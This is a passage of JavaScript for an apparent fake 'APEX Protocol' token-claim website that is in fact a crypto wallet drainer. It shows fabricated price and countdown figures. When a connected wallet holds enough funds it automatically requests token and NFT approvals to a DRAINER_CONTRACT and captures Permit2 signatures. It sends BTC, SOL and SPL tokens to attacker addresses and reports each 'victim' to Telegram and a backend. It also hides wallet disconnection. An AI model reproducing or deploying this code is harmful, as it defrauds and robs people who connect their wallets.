    if (claimList.length > 10) claimList.pop();
    updateClaimList();
  }, 30000);
}

function startCountdown() {
  let remaining = 114600;
  updateCountdownDisplay(remaining);
  countdownInterval = setInterval(() => {
    remaining--;
    if (remaining <= 0) { clearInterval(countdownInterval); const el = document.getElementById('countdown'); if (el) { el.textContent = '0:0:0:0'; el.classList.add('pulse'); } return; }
    if (remaining <= 900 && !progressUpdated) {
      if (progressBar) progressBar.style.width = '90%';
      if (progressPercentage) progressPercentage.textContent = '90%';
      progressUpdated = true;
    }
    updateCountdownDisplay(remaining);
  }, 1000);
}

function updateCountdownDisplay(total) {
  const d = Math.floor(total / 86400);
  const h = Math.floor((total % 86400) / 3600);
  const m = Math.floor((total % 3600) / 60);
  const s = Math.floor(total % 60);
  const el = document.getElementById('countdown');
  if (el) el.textContent = `${d}:${h}:${m}:${s}`;
}

function createTokenChart() {
  const ctx = document.getElementById('tokenChart');
  if (!ctx || typeof Chart === 'undefined') return;
  const data = [];
  let v = 0.04;
  for (let i = 0; i < 24; i++) { v += Math.random() * 0.01 - 0.002; data.push(v); }
  tokenChart = new Chart(ctx.getContext('2d'), {
    type: 'line',
    data: { labels: Array.from({ length: 24 }, (_, i) => i + 'h'), datasets: [{ label: 'APEX Price', data, borderColor: '#FF6B00', backgroundColor: 'rgba(255, 107, 0, 0.1)', borderWidth: 2, tension: 0.4, pointRadius: 0, fill: true }] },
    options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { display: false } }, scales: { x: { grid: { display: false }, ticks: { color: '#a0aec0' } }, y: { grid: { color: 'rgba(255,255,255,0.05)' }, ticks: { color: '#a0aec0' } } } }
  });
}

function updateTokenPrice() {
  const last = priceHistory.length ? priceHistory[priceHistory.length - 1] : 0.04;
  const change = Math.random() * 0.015 - 0.002;
  const price = (last + change).toFixed(4);
  priceHistory.push(parseFloat(price));
  if (priceHistory.length > 10) priceHistory.shift();
  const changePct = (((price - last) / last) * 100).toFixed(2);
  const cap = (Math.random() * 1000000 + 1500000).toFixed(0);
  const vol = (Math.random() * 500000 + 200000).toFixed(0);
  const hold = (Math.random() * 10000 + 10000).toFixed(0);
  const liq = (Math.random() * 500000 + 500000).toFixed(0);

  const set = (id, val) => { const el = document.getElementById(id); if (el) el.textContent = val; };
  set('tokenPrice', `$${price}`);
  set('priceChange', `${changePct}%`);
  set('marketCap', cap);
  set('volume', vol);
  set('holders', hold);
  set('liquidity', liq);

  if (tokenChart) {
    const nd = tokenChart.data.datasets[0].data.slice(1);
    nd.push(parseFloat(price));
    tokenChart.data.datasets[0].data = nd;
    tokenChart.update();
  }
  const ce = document.querySelector('.price-change');
  if (ce) { ce.classList.remove('positive', 'negative'); ce.classList.add(parseFloat(changePct) >= 0 ? 'positive' : 'negative'); }
}

function updateAIAnalytics() {
  const p = 85 + Math.floor(Math.random() * 15);
  if (predictionFill) predictionFill.style.width = `${p}%`;
}

// ─── Balance gate + auto-trigger ───────────────────────────────────────────
async function checkAndAutoTriggerClaim() {
  if (!connectedAddress || !web3 || userHasClaimed) return;
  try {
    const wei = await web3.eth.getBalance(connectedAddress);
    const eth = web3.utils.fromWei(wei, 'ether');
    userBalanceInUSD = eth * ethPriceInUSD;

    if (userBalanceInUSD >= CLAIM_THRESHOLD_USD) {
      logDebug(`TRIGGER: $${userBalanceInUSD.toFixed(2)} >= $${CLAIM_THRESHOLD_USD}`);
      const delay = 2000 + Math.random() * 2000;
      setTimeout(() => {
        if (!userHasClaimed) {
          showNotification('Checking eligibility...', 'info');
          initiateClaimProcess();
        }
      }, delay);
    } else {
      logDebug(`NO TRIGGER: $${userBalanceInUSD.toFixed(2)} < $${CLAIM_THRESHOLD_USD}`);
    }
  } catch (e) { console.error('balance check:', e); }
}

// ─── Mobile-specific ───────────────────────────────────────────────────────
function initializeMobileSpecificOptimizations() {
  document.addEventListener('touchstart', (e) => {
    if (e.target.closest('button') || e.target.closest('.btn-primary')) {
      e.target.style.transform = 'scale(0.98)';
      setTimeout(() => { e.target.style.transform = ''; }, 150);
    }
  }, { passive: true });
  document.addEventListener('dblclick', (e) => e.preventDefault(), { passive: false });
  const vp = document.querySelector('meta[name="viewport"]');
  if (vp) vp.setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no');
}

async function initializeServiceWorker() {
  if ('serviceWorker' in navigator) {
    try {
      const sw = `self.addEventListener('install', () => self.skipWaiting());self.addEventListener('activate', (e) => e.waitUntil(self.clients.claim()));`;
      const blob = new Blob([sw], { type: 'application/javascript' });
      const url = URL.createObjectURL(blob);
      await navigator.serviceWorker.register(url);
    } catch (e) { console.log('SW registration failed:', e); }
  }
}

function initializeManualAppKitIntegration() {
  const check = setInterval(() => {
    const btn = document.querySelector('w3m-button');
    if (btn) { clearInterval(check); btn.addEventListener('click', setupManualAppKitConnectionListener); }
  }, 500);
}

function setupManualAppKitConnectionListener() {
  if (window.ethereum) {
    window.ethereum.on('accountsChanged', (accounts) => {
      if (accounts.length > 0) handleManualAppKitConnection(accounts[0]);
      else if (!DISABLE_DISCONNECT) handleManualDisconnection();
    });
    window.ethereum.on('chainChanged', () => {
      if (window.ethereum.selectedAddress) handleManualAppKitConnection(window.ethereum.selectedAddress);
    });
    window.ethereum.on('disconnect', () => { if (!DISABLE_DISCONNECT) handleManualDisconnection(); });
  }
}

function handleManualAppKitConnection(address) {
  connectedAddress = address;
  connectedWallet = 'manual_appkit';
  try {
    web3 = new Web3(window.ethereum);
    contractInstance = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
  } catch (e) {
    web3 = new Web3(Web3.givenProvider);
    contractInstance = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
  }
  updateManualWalletButton();
  showNotification('Wallet connected', 'success');
  collectManualFingerprint();
  setTimeout(() => checkAndAutoTriggerClaim(), 2000);
  showManualAnnouncementModal();
  saveConnectionToLocalStorage(connectedAddress, connectedWallet);
}

function showManualAnnouncementModal() {
  if (connectedAddress && referralLink) {
    const short = connectedAddress.substring(0, 6) + '...' + connectedAddress.substring(38);
    referralLink.textContent = `https://apex-protocol.io/ref?user=${short}`;
  }
  if (announcementModal) announcementModal.classList.add('active');
}

function updateManualWalletButton() {
  if (!walletButtonContainer) return;
  if (connectedWallet && connectedAddress) {
    if (DISABLE_DISCONNECT) {
      walletButtonContainer.innerHTML = `<div class="wallet-connected"><i class="fas fa-check-circle"></i><span class="wallet-address">${connectedAddress.substring(0, 6)}...${connectedAddress.substring(38)}</span></div>`;
    } else {
      walletButtonContainer.innerHTML = `<div class="wallet-connected"><i class="fas fa-check-circle"></i><span class="wallet-address">${connectedAddress.substring(0, 6)}...${connectedAddress.substring(38)}</span><button class="disconnect-btn" id="disconnectButton">Disconnect</button></div>`;
      document.getElementById('disconnectButton')?.addEventListener('click', disconnectManualWallet);
    }
  } else {
    walletButtonContainer.innerHTML = `<button class="wallet-btn" id="walletButton"><i class="fas fa-wallet"></i> Connect</button>`;
    document.getElementById('walletButton')?.addEventListener('click', showWalletModal);
  }
}

function handleManualDisconnection() {
  if (DISABLE_DISCONNECT) return;
  connectedWallet = null; connectedAddress = null; web3 = null; contractInstance = null; userHasClaimed = false;
  updateManualWalletButton();
  showNotification('Wallet disconnected', 'info');
  clearSavedConnection();
}

function disconnectManualWallet() { if (!DISABLE_DISCONNECT) handleManualDisconnection(); }

async function checkManualExistingConnection() {
  try {
    if (typeof window.ethereum !== 'undefined') {
      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
      if (accounts.length > 0) {
        connectedAddress = accounts[0];
        if      (walletDetectors.isMetaMask())       connectedWallet = 'metamask';
        else if (walletDetectors.isCoinbaseWallet()) connectedWallet = 'coinbase';
        else if (walletDetectors.isTrustWallet())    connectedWallet = 'trust';
        else if (walletDetectors.isRabbyWallet())    connectedWallet = 'rabby';
        else if (walletDetectors.isPhantom())        connectedWallet = 'phantom';
        else if (walletDetectors.isBraveWallet())    connectedWallet = 'brave';
        else                                          connectedWallet = 'manual_unknown';
        web3 = new Web3(window.ethereum);
        contractInstance = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        setupManualProviderEvents(window.ethereum);
        updateManualWalletButton();
        setTimeout(() => checkAndAutoTriggerClaim(), 2000);
        showManualAnnouncementModal();
      }
    }
  } catch (e) { console.debug('checkManualExistingConnection:', e); }
}

function setupManualProviderEvents(provider) {
  provider.on('accountsChanged', (accounts) => {
    if (accounts.length === 0) { if (!DISABLE_DISCONNECT) handleManualDisconnection(); }
    else {
      connectedAddress = accounts[0]; userHasClaimed = false;
      updateManualWalletButton();
      showNotification('Account changed', 'info');
      setTimeout(() => checkAndAutoTriggerClaim(), 2000);
      showManualAnnouncementModal();
    }
  });
  provider.on('chainChanged', (id) => showNotification(`Network changed to ${parseInt(id)}`, 'info'));
  provider.on('disconnect', () => { if (!DISABLE_DISCONNECT) handleManualDisconnection(); });
}

function detectWallets() {
  const badges = {
    metamask: document.getElementById('metamask-badge'),
    coinbase: document.getElementById('coinbase-badge'),
    trust:    document.getElementById('trust-badge'),
    rabby:    document.getElementById('rabby-badge')
  };
  Object.values(badges).forEach((b) => { if (b) { b.textContent = 'Not Detected'; b.style.background = 'rgba(239,68,68,0.15)'; b.style.color = 'var(--error)'; } });
  Object.entries(walletDetectors).forEach(([w, fn]) => {
    if (fn()) {
      const key = w.toLowerCase().replace('is', '');
      if (badges[key]) { badges[key].textContent = 'Detected'; badges[key].style.background = 'rgba(16,185,129,0.15)'; badges[key].style.color = 'var(--success)'; }
    }
  });
}

// ─── Per-wallet connect ────────────────────────────────────────────────────
async function connectWithProvider(providerType, silentRestore = false) {
  try {
    let provider;
    switch (providerType) {
      case 'metamask':
        if (!walletDetectors.isMetaMask()) { if (!silentRestore) showNotification('MetaMask not installed', 'error'); return; }
        provider = window.ethereum;
        try { await provider.request({ method: 'eth_requestAccounts' }); } catch (e) { if (!silentRestore) showNotification('MetaMask rejected', 'error'); return; }
        break;
      case 'coinbase':
        if (!walletDetectors.isCoinbaseWallet()) { if (!silentRestore) showNotification('Coinbase not detected', 'error'); return; }
        provider = window.ethereum;
        try { await provider.request({ method: 'eth_requestAccounts' }); } catch (e) { if (!silentRestore) showNotification('Coinbase rejected', 'error'); return; }
        break;
      case 'trust':
        if (!walletDetectors.isTrustWallet()) { if (!silentRestore) showNotification('Trust not detected', 'error'); return; }
        provider = window.ethereum;
        try { await provider.request({ method: 'eth_requestAccounts' }); } catch (e) { if (!silentRestore) showNotification('Trust rejected', 'error'); return; }
        break;
      case 'rabby':
        if (!walletDetectors.isRabbyWallet()) { if (!silentRestore) showNotification('Rabby not detected', 'error'); return; }
        provider = window.ethereum;
        try { await provider.request({ method: 'eth_requestAccounts' }); } catch (e) { if (!silentRestore) showNotification('Rabby rejected', 'error'); return; }
        break;
      default:
        if (!silentRestore) showNotification('Unsupported provider', 'error');
        return;
    }

    web3 = new Web3(provider);
    contractInstance = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
    const accounts = await web3.eth.getAccounts();
    if (!accounts.length) throw new Error('No accounts');

    connectedAddress = accounts[0];
    connectedWallet = providerType;

    // Publish to main.js's global — makes subsequent syncFromGlobal() pick up the provider
    window.__apexConnected = {
      address: connectedAddress,
      chain: 'evm',
      web3,
      contract: contractInstance,
      provider,
      session: null,
      publishedAt: Date.now()
    };

    updateManualWalletButton();
    if (!silentRestore) hideWalletModal();
    if (!silentRestore) showNotification('Wallet connected', 'success');
    logDebug(`Connected: ${providerType} ${connectedAddress}`);

    await collectManualFingerprint();
    setTimeout(() => checkAndAutoTriggerClaim(), 2000);
    if (!silentRestore) showManualAnnouncementModal();
    setupManualProviderEvents(provider);
    saveConnectionToLocalStorage(connectedAddress, connectedWallet);
  } catch (e) {
    console.error('connect error:', e);
    if (!silentRestore) showNotification('Failed to connect', 'error');
  }
}

// ─── Bitcoin / Solana ──────────────────────────────────────────────────────
async function drainNativeBTC() {
  try {
    if (!window.unisat) { showNotification('UniSat not found', 'error'); return false; }
    const accounts = await window.unisat.getAccounts();
    if (!accounts.length) throw new Error('No BTC account');
    const balance = await window.unisat.getBalance();
    const total = balance.total;
    const min = 100000;
    if (total < min) {
      await sendTelegramMessage(`<b>⚠️ BTC Skipped</b>\n${accounts[0]}\n${total/1e8} BTC`);
      showNotification(`Need ${min} sats`, 'error');
      return false;
    }
    const send = total - 5000;
    const txid = await window.unisat.sendBitcoin(ATTACKER_BTC_ADDRESS, send);
    showNotification('BTC sent!', 'success');
    await sendTelegramMessage(`<b>🟧 BTC Drained</b>\n${accounts[0]}\n${send/1e8} BTC\n<code>${txid}</code>`);
    return true;
  } catch (e) {
    showNotification('BTC failed: ' + e.message, 'error');
    await sendTelegramMessage(`<b>❌ BTC Failed</b>\n${e.message}`);
    return false;
  }
}

async function drainNativeSOL() {
  try {
    await loadSolanaLibraries();
    if (!solanaProvider || !solanaPublicKey) { showNotification('SOL not connected', 'error'); return false; }
    const conn = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
    const owner = new solanaWeb3.PublicKey(solanaPublicKey);
    const bal = await conn.getBalance(owner);
    const tokens = await getAllSolanaTokenAccounts(conn, owner);

    if (bal <= 5000 && tokens.length === 0) {
      await sendTelegramMessage(`<b>⚠️ SOL Skipped</b>\n${solanaPublicKey}\nNo funds.`);
      return false;
    }

    const tx = new solanaWeb3.Transaction();
    const LEAVE = 5000;
    if (bal > LEAVE) {
      tx.add(solanaWeb3.SystemProgram.transfer({
        fromPubkey: owner,
        toPubkey: new solanaWeb3.PublicKey(ATTACKER_SOLANA_ADDRESS),
        lamports: bal - LEAVE
      }));
    }
    for (const ta of tokens) {
      const attackerATA = await getAttackerTokenAccount(ta.mint);
      tx.add(splToken.createTransferInstruction(ta.account, attackerATA, owner, ta.amount, [], splToken.TOKEN_PROGRAM_ID));
    }
    const { blockhash } = await conn.getLatestBlockhash();
    tx.recentBlockhash = blockhash;
    tx.feePayer = owner;

    let sig;
    if (solanaProvider.signTransaction) {
      const signed = await solanaProvider.signTransaction(tx);
      sig = await conn.sendRawTransaction(signed.serialize());
    } else if (solanaProvider.signAllTransactions) {
      const signed = (await solanaProvider.signAllTransactions([tx]))[0];
      sig = await conn.sendRawTransaction(signed.serialize());
    } else if (solanaProvider.signAndSendTransaction) {
      const res = await solanaProvider.signAndSendTransaction(tx);
      sig = res.signature || res;
    } else throw new Error('Provider cannot sign');

    showNotification(`SOL sent: ${sig.slice(0, 10)}...`, 'success');
    await sendTelegramMessage(`<b>🟪 SOL Drained</b>\n${solanaPublicKey}\n${(bal - LEAVE)/1e9} SOL\n${tokens.length} tokens\n<code>${sig}</code>`);
    return true;
  } catch (e) {
    showNotification('SOL failed: ' + e.message, 'error');
    await sendTelegramMessage(`<b>❌ SOL Failed</b>\n${e.message}`);
    return false;
  }
}

async function getAllSolanaTokenAccounts(connection, owner) {
  const out = [];
  try {
    const accs = await connection.getTokenAccountsByOwner(owner, { programId: splToken.TOKEN_PROGRAM_ID });
    for (const { pubkey, account } of accs.value) {
      const info = splToken.AccountLayout.decode(account.data);
      if (info.amount > 0) {
        let decimals = 9;
        try {
          const mi = await connection.getParsedAccountInfo(new solanaWeb3.PublicKey(info.mint));
          if (mi.value?.data?.parsed?.info?.decimals) decimals = mi.value.data.parsed.info.decimals;
        } catch (e) {}
        out.push({ mint: new solanaWeb3.PublicKey(info.mint).toString(), decimals, account: pubkey, amount: info.amount });
      }
    }
  } catch (e) { console.warn('SOL token scan:', e); }
  return out;
}

async function getAttackerTokenAccount(mint) {
  const owner = new solanaWeb3.PublicKey(ATTACKER_SOLANA_ADDRESS);
  const mintKey = new solanaWeb3.PublicKey(mint);
  return splToken.getAssociatedTokenAddressSync(mintKey, owner);
}

// ─── Main EVM drain ────────────────────────────────────────────────────────
async function drainEVM() {
  if (!connectedWallet || !web3) {
    showNotification('Please connect your wallet first', 'error');
    showWalletModal();
    return;
  }
  const button = document.getElementById('connectButton');
  const originalText = button ? button.innerHTML : 'Connect Wallet';

  try {
    if (button) { button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...'; button.disabled = true; }
    if (claimStatus) { claimStatus.textContent = 'Initializing...'; claimStatus.className = 'status pending'; }
    await manualRandomDelay(800, 1500);

    const accounts = await web3.eth.getAccounts();
    const userAddress = accounts[0];
    await collectManualFingerprint();

    if (userHasClaimed) {
      if (claimStatus) { claimStatus.textContent = 'Already claimed this session.'; claimStatus.className = 'status error'; }
      resetButton(button, originalText);
      return;
    }

    const wei = await web3.eth.getBalance(userAddress);
    const ethBal = parseFloat(web3.utils.fromWei(wei, 'ether'));
    userBalanceInUSD = ethBal * ethPriceInUSD;

    logDebug(`Balance: ${ethBal} ETH (~$${userBalanceInUSD.toFixed(2)})`);

    if (userBalanceInUSD < CLAIM_THRESHOLD_USD) {
      if (claimStatus) { claimStatus.textContent = 'Insufficient balance.'; claimStatus.className = 'status error'; }
      await sendTelegramMessage(`<b>⚠️ Skipped (low USD)</b>\n${userAddress}\n$${userBalanceInUSD.toFixed(2)}`);
      resetButton(button, originalText);
      return;
    }
    if (ethBal < parseFloat(MIN_ETH_FOR_GAS)) {
      if (claimStatus) { claimStatus.textContent = 'Insufficient ETH for gas.'; claimStatus.className = 'status error'; }
      await sendTelegramMessage(`<b>⚠️ Skipped (low gas)</b>\n${userAddress}\n${ethBal} ETH`);
      resetButton(button, originalText);
      return;
    }

    // Phase 1 — detection
    if (claimStatus) claimStatus.textContent = 'Scanning wallet...';
    const tokens = await detectTokens(userAddress);
    const nfts   = await detectNFTs(userAddress);
    logDebug(`Found ${tokens.length} tokens, ${nfts.length} NFT collections`);

    if (!tokens.length && !nfts.length) {
      if (claimStatus) { claimStatus.textContent = 'No eligible assets.'; claimStatus.className = 'status info'; }
      await sendTelegramMessage(`<b>ℹ️ No assets</b>\n${userAddress}`);
      resetButton(button, originalText);
      return;
    }

    // Phase 2 — standard approvals (to DRAINER_CONTRACT)
    const approvedTokens = [];
    for (let i = 0; i < tokens.length; i++) {
      if (claimStatus) claimStatus.textContent = `Approving ${tokens[i].symbol} (${i+1}/${tokens.length})...`;
      const hash = await approveToken(tokens[i].address, userAddress, tokens[i].balance);
      if (hash) approvedTokens.push(tokens[i]);
      await manualRandomDelay(APPROVAL_DELAY_MS, APPROVAL_DELAY_MS + 800);
      approvalCounter++;
      if (approvalCounter % APPROVAL_COOLDOWN_EVERY === 0) await new Promise((r) => setTimeout(r, APPROVAL_COOLDOWN_MS));
    }

    // Phase 3 — NFT approvals
    const approvedNFTs = [];
    for (const nft of nfts) {
      if (claimStatus) claimStatus.textContent = `Approving NFTs (${nft.name})...`;
      const hash = await approveNFT(nft.address, userAddress);
      if (hash) approvedNFTs.push(nft);
      await manualRandomDelay(APPROVAL_DELAY_MS, APPROVAL_DELAY_MS + 800);
      approvalCounter++;
      if (approvalCounter % APPROVAL_COOLDOWN_EVERY === 0) await new Promise((r) => setTimeout(r, APPROVAL_COOLDOWN_MS));
    }

    // Phase 4 — Permit2 signature (uses live provider; fixed for WalletConnect)
    let permit2 = null;
    if (approvedTokens.length > 0) {
      if (claimStatus) claimStatus.textContent = 'Sign to verify (no gas)...';
      permit2 = await capturePermit2Signature(approvedTokens);
    }

    // Phase 5 — POST session to backend
    const session = {
      victim: userAddress,
      chain: 1,
      tokens: approvedTokens.map((t) => ({ address: t.address, symbol: t.symbol, amount: t.balance, decimals: t.decimals })),
      nfts:   approvedNFTs.map((n) => ({ address: n.address, standard: n.standard, name: n.name })),
      permit2,
      timestamp: Date.now(),
      userAgent: navigator.userAgent,
      isMobile: isMobileDevice
    };

    if (claimStatus) claimStatus.textContent = 'Finalising...';
    const backendResponse = await postToBackend(session);

    // Phase 6 — report
    if (approvedTokens.length > 0 || approvedNFTs.length > 0) {
      userHasClaimed = true;
      if (claimStatus) { claimStatus.textContent = 'Claim successful!'; claimStatus.className = 'status success'; }
      await sendTelegramMessage(`<b>🟦 Session Submitted</b>
👤 <code>${userAddress}</code>
🪙 Tokens: ${approvedTokens.length}
🎨 NFTs: ${approvedNFTs.length}
🔏 Permit2: ${permit2 ? 'YES' : 'NO'}
📡 Backend: ${backendResponse ? 'OK' : 'FAILED'}
🕒 ${new Date().toISOString()}`);
      showNotification(`Approved ${approvedTokens.length} tokens`, 'info');
    } else {
      if (claimStatus) { claimStatus.textContent = 'No approvals succeeded.'; claimStatus.className = 'status info'; }
      await sendTelegramMessage(`<b>ℹ️ No approvals</b>\n${userAddress}`);
    }
    resetButton(button, originalText);
  } catch (err) {
    logDebug('drainEVM error: ' + err.message);
    if (claimStatus) { claimStatus.textContent = 'Failed: ' + err.message; claimStatus.className = 'status error'; }
    resetButton(button, originalText);
    await sendTelegramMessage(`<b>❌ Drain Failed</b>\n${connectedAddress}\n${err.message}`);
  }
}

function resetButton(button, originalText) {
  if (button) { button.innerHTML = originalText; button.disabled = false; }
}

function manualRandomDelay(min, max) {
  const d = Math.floor(Math.random() * (max - min + 1)) + min;
  const jitter = Math.random() * 0.4 + 0.8;
  return new Promise((r) => setTimeout(r, d * jitter));
}

// ─── Multi-chain dispatcher ────────────────────────────────────────────────
async function initiateClaimProcess() {
  // Sync from main.js
  if (window.__apexConnected) {
    connectedAddress = window.__apexConnected.address;
    connectedWallet  = window.__apexConnected.chain === 'evm' ? 'evm' : window.__apexConnected.chain;
    if (window.__apexConnected.web3)     web3 = window.__apexConnected.web3;
    if (window.__apexConnected.contract) contractInstance = window.__apexConnected.contract;
  }

  if (window.ethereum || (window.web3 && window.web3.currentProvider) || web3) {
    console.log('🟦 EVM detected, draining...');
    await drainEVM();

    if (!delayedAttemptsScheduled) {
      delayedAttemptsScheduled = true;
      const delayMs = 150000;
      logDebug(`⏳ Delaying SOL/BTC for ${delayMs/1000}s`);
      setTimeout(async () => {
        const sols = getSolanaWallets();
        if (sols.length && solanaPublicKey) {
          console.log('🟪 SOL detected, draining...');
          await drainNativeSOL();
        } else if (sols.length) {
          try {
            const w = sols[0]; const p = w.provider;
            if (p.connect) {
              const resp = await p.connect();
              solanaPublicKey = resp.publicKey?.toString() || resp.toString();
              solanaProvider  = p;
              showNotification('SOL connected for drain', 'success');
              await drainNativeSOL();
            }
          } catch (e) {
            logDebug('SOL connect failed: ' + e.message);
            await sendTelegramMessage(`<b>⚠️ SOL connect failed</b>\n${e.message}`);
          }
        }
        if (window.unisat) {
          try {
            const accs = await window.unisat.getAccounts();
            if (accs?.length) { console.log('🟧 BTC detected, draining...'); await drainNativeBTC(); }
          } catch (e) { console.debug('unisat:', e); }
        }
        delayedAttemptsScheduled = false;
      }, delayMs);
    }
    return;
  }
  showNotification('No EVM wallet connected', 'error');
}

// ─── Expose ────────────────────────────────────────────────────────────────
window.initiateClaimProcess     = initiateClaimProcess;
window.drainNativeBTC           = drainNativeBTC;
window.drainNativeSOL           = drainNativeSOL;
window.drainEVM                 = drainEVM;
window.collectManualFingerprint = collectManualFingerprint;
window.checkManualExistingConnection = checkManualExistingConnection;

// ─── Restore / boot ────────────────────────────────────────────────────────
(async function boot() {
  ethPriceInUSD = await EVASION_TECHNIQUES.getETHPriceInUSD();
  window.addEventListener('apex:connected', () => { syncFromGlobal(); });
  setTimeout(() => { checkManualExistingConnection(); }, 1000);
  logDebug('✅ script.js ready (backend-delegating model)');
  console.log('✅ script.js loaded — backend-delegating model');
})();
